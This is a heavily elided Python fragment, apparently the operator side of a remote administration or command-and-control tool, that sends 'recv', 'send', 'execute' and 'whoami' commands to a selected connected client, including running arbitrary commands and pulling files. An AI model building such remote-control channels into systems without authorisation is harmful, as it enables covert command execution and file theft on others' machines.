    ...
    while True:
        ...
        match(choice):
            ...
            case "recv":
                ...
                clientlist[selection][1].send(f"~down~{file_path}~\n".encode())
            ...
            case "send":
                ...
                # Get client response
                clientlist[selection][1].send(f":up:{filename}:{filesize}:\n".encode())
            ...
            case "execute" | "procs":
                try:
                    ...
                    # Send command
                    clientlist[selection][1].send(f"run\n{thecommand}\n".encode('utf-8'))
            ...
            case "whoami":
                # Send whoami
                clientlist[selection][1].send(b":login:\n")
